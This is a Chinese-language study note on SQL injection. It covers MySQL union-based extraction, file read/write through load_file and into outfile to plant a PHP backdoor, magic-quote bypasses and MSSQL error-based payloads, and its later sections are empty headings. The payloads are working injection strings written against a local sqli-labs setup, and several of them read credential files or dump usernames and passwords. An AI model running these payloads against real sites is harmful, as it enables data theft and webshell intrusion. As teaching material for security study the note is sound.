# SQL注入——高危漏洞

## 危害

### 危害数据库中的数据

1. 数据库信息泄露：未经授权访问数据库中信息
2. 网页篡改：登录后台发布恶意内容

### 直接危害网站权限

1. 网站挂马
2. 私自添加系统账号
3. 读写文件获取webshell



## SQL注入原理与产生条件

### 原理

一般代码执行SQL语句的过程，本质上就是传递SQL语句到数据库中去执行

SQL注入即是**通过参数传递，将恶意SQL语句传到后台可以执行的SQL语句当中**，实现自定义的攻击方式

1. 对用户输入的参数没有进行严格过滤（如过滤单双引号 尖括号等），就被带到数据库执行，造成了SQL注入
2. 使用了字符串拼接的方式构造SQL语句

### 产生条件

1. 可控变量：即变量可以由客户端控制，或者说可以通过参数传递改变

2. 带入数据库查询：将参数拼接到SQL语句中带入数据库执行

3. 对于用户可控制的变量未过滤或过滤不严谨

## MySQL注入

### MySQL注入之总体思路



### MySQL注入之MySQL基础

一条SQL语句的执行结果是一条或多条数据记录

- 句返回结果的字段数量

- `select 1,2,3,4`：猜解输出位置

- `limit N,M`：变动猜解多个数据——通过limit n,1 变动猜解多个数据

- `group_concat()`函数：连接一个组的所有字符串，并以逗号分隔每一条数据

- `information_schema`数据库：数据库字典
  - `information_schema.schemata`表
    - 列`schema_name`记录了所有数据库的名字(高权限跨库查询时用来查数据库名)
  - `information_schema.tables`表
    - 列`table_schema`记录了所有数据库的名字
    - 列`table_name`记录了所有数据库的表的名字
  - `information_schema.columns`表
    - 列`table_schema`记录了所有数据库的名字
    - 列`table_name`记录了所有数据库的表的名字
    -   列`column_name`记录了所有数据库的表的列的名字

### MySQL注入之显错注入——联合查询

#### 基本流程

![202201281932899](https://img.yatjay.top/md/202203261110509.png)

##### 第1步：判断是否存在注入点

##### 第2步： 猜解SQL语句执行结果列名字段数量 order by

##### 第3步：联合查询寻找输出点 union select 1,2,3,…,x

##### 第4步：数据库信息收集——在注入点处向系统自带库查询库名、表名、字段名

###### 爆数据库名database()、用户名user()

###### 爆当前数据库中数据表名group_concat(table_name) from information_schema.tables where table_schema=database()

###### 爆当前数据库数据表的字段名group_concat(column_name) from information_schema.columns where table_name=‘表名’ and table_schema=database()

##### 第5步：查询指定数据——爆字段值 group_concat(username,'>',password),2 from users

### MySQL注入之高权限注入

除root之外其他都简称为为普通用户权限，能操作有限的一个或几个数据库

root在MySQL数据库中属于最高权限，能操作主机上的所有数据库

`information_schema`库的`schemata`表中查询其他库名(目标库名一般和目标网站名称相关联)，`information_schema.schemata`  的列`schema_name`记录了所有数据库的名字。

### MySQL注入之注入点文件读写

MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。

在利用SQL注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：

- `into dumpfile()`
- `into outfile()`
- `load_file()`

#### MySQL读写文件操作条件

上述函数能否成功执行受到参数 `secure_file_priv` 的影响。官方文档中的描述翻译一下就是

- 其中当参数 `secure_file_priv` 为空(即不进行设置)时，对导入导出无限制
- 当值为一个指定的目录时，只能向指定的目录导入导出
- 当值被设置为NULL时，禁止导入导出功能

在 MySQL 5.5 之前` secure_file_priv` 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 `secure_file_priv` 默认是 NULL，这个情况下不可以写文件

#### MySQL文件读写函数

##### load_file() 读取函数

```sql
?id=-1' union select 1,load_file('D:/JayProgram/PHPstudy/PHPTutorial/WWW/test.txt'),3--+
或
?id=-1' union select 1,load_file('D:\\\JayProgram\\PHPstudy\\PHPTutorial\\WWW\\test.txt'),3--+
```

##### into outfile 或 into dumpfile 导出(写入)函数

###### into outfile

```sql
?id=-1' union select 1, 'a\nabc\nabcde' ,3 into outfile 'd:/test.txt'--+
```

###### into dumpfile

```sql
?id=-1' union select 1, 'a\nabc\nabcde' ,3 into dumpfile 'd:/test.txt'--+
```

#### 获取路径及读取文件列表

##### 常见方法

###### 报错显示

网站报错的时候会泄漏出自己的路径（扫描工具/手动探测）

###### 遗留文件

调试软件或者平台遗留下来的文件，经典的就是phpinfo.php(扫描工具可以扫到)

###### 漏洞报错

知道网站是用什么cms或者框架进行搭建的，用搜索引擎去找到对应的爆路径方式，比如搜索phpcms 爆路径

就可以利用该网站相关漏洞爆出网站路径，一般访问相应的文件地址，返回的报错信息就会显示网站路径信息

###### 平台配置文件

结合前面的读取文件操作来读取搭建网站平台的配置文件，通过[默认路径](https://blog.csdn.net/weixin_30292843/article/details/99381669)去尝试找到突破口，但如果更改了默认安装路径，也是很难进行（不怎么常用）。

比如：Apache的默认配置文件目录为`/usr/local/app/apache2/conf/extratpd-vhosts.conf`在Apache安装目录下面的`/conf/extratpd-vhosts.conf`

###### 爆破

什么信息都没办法获取到，我们运用一些常见固定的可能安装位置生成字典，对目标网站进行爆破

#### 读写文件

找到路径后进行的操作，常见的就是读取文件列表

##### 读取敏感文件

```sql
?id=-1' union select 1, load_file('D:\\JayProgram\\PHPstudy\\PHPTutorial\\WWW\\PenTest\\sqlilabs\\sql-connections\\db-creds.inc') ,3 --+
```

##### 写入后门代码

```sql
?id=-1' union select 1, 'xxxxxxxxxxxxxxxx' ,3 into outfile 'D:/JayProgram/PHPstudy/PHPTutorial/WWW/PenTest/sqlilabs/xxx.php'--+
```

#### 常见读写文件问题：PHP魔术引号开关

当magic_quotes_gpc = On时，输入数据中含**单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）**等字符，都会被加上反斜线。这些转义是必须的。

php中的`magic_quotes_gpc`是配置在php.ini中。

`magic_quotes_gpc`开关在高版本的PHP中已经移除。。。

![202201312146770](https://img.yatjay.top/md/202203261111607.png)

##### 魔术引号的绕过

###### 编码绕过

将要写入的目录/路径进行十六进制编码后在注入点处写入，SQL可以执行十六进制编码的SQL语句，而且由于进行了编码，`magic_quotes_gpc`开关不会对十六进制编码中的特定字符进行过滤。

###### 宽字节绕过

(未讲解)

### 低版本MySQL注入方法——需要配合读取或暴力

#### 字典暴力

用列名、表名字典自己去跑来获得数据库信息。

#### 读取配合

如果当前数据库用户为root，则可以读取到当前php文件，在php文件中就有相关SQL语句，从这些SQL语句中可以得知表名、列名信息 。但是一般如果有root权限，可以直接写入后门文件获取webshell，不用读取文件信息。

一般低版本MySQL比较少见。

### MySQL注入之SQL注入的防护

#### 自带防御如魔术引号

#### 内置函数对提交内容进行检查

#### 自定义关键字，对敏感参数进行过滤或替换

#### WAF等防护软件

==11、12、13==



## SQL注入之类型及提交注入

### SQL注入的参数类型——排除干扰符号，正确闭合SQL语句

为了便于绕过SQL语句中的干扰符号，即为了正确闭合SQL语句，需要区分提交参数的类型，主要有以下几种

1. 数字类型
2. 字符类型
3. 搜索类型(模糊查询)
4. Json类型

注：其中 SQL 语句干扰符号：’ , " ,% , ) , } 等，具体需看写法

### SQL注入的请求方法——明确参数位置，确定何处提交

区分请求方法，是为了明确SQL注入提交参数的位置在哪里

1. GET方法——`$_GET['g']`：小数据一般采用GET方法提交
2. POST方法——`$_POST['p']`：大数据一般采用POST方法提交
3. REQUEST方法——`$_REQUEST['r']`：REQUEST不论GET方法或POST方法提交参数都能接收
4. COOKIE——`$_COOKIE['c']`：COOKIE方法提交参数，需要在请求头的Cookie值处提交
5. SERVER——`$\_SERVER`：SQL注入漏洞的原理即是接收数据并且把该数据带入数据库中进行查询，若目标主机会把访问者信息中的字段带入数据库进行执行，此时数据接收发生在数据包中，只需在数据包中写注入语句，即是**HTTP头部注入**。



## SQL注入之Oracle、MongoDB等注入

除了Access数据库之外，其他数据库的架构类似，其他数据库的SQL注入基本步骤如下所示

![202202062132539](https://img.yatjay.top/md/202203261111797.png)

### 明确数据库类型、权限——连接数据库的文件即数据库配置文件决定注入点用户权限

### 各种数据库注入思路

#### SQL server/MSSQL

##### **①**判断数据库类型

and exists (select * from sysobjects)--返回正常为mssql(也名sql server)

and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈

##### **②**判断数据库版本

and 1=@@version--这个语句要在有回显的模式下才可以哦

and substring((select  @@version),22,4)='2008'--适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）

##### **③**获取所有数据库的个数 (以下3条语句可供选择使用)

1. and 1=(select quotename(count(name)) from master..sysdatabases)--

2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --

3. and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --

  and 1=(select str(count(name))%2b'|' from master..sysdatabases where dbid>5) --

  and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid>5) --

说明：dbid从1-4的数据库一般为系统数据库.

##### **④**获取数据库 （该语句是一次性获取全部数据库的，且语句只适合>=2005，两条语句可供选择使用）

​    and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--

​    and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--

##### ⑤获取当前数据库

and db_name()>0

and 1=(select db_name())--

##### **⑥**获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】

​    and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))-- 

​     and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U'  FOR XML PATH(''))--

##### **⑦**获得表里的列

一次爆指定表的所有列（只限于mssql2005及以上版本）：

​     and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- 

​     and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--

##### ⑧获取指定数据库中的表的列的数据库

逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：

​    and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(''))--

一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：

​     and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(''))--测试效果图：----------------------------------加上where条件筛选结果出来会更加好，如：where  and name like '%user%' 就会筛选出含有user关键词的出来。用在筛选表段时很不错。



==15空==



## SQL注入之查询方式及报错注入

















## SQL注入之二次、加解密、DNS等注入













## SQL注入之堆叠及WAF绕过注入











## SQL注入之SQLmap绕过WAF
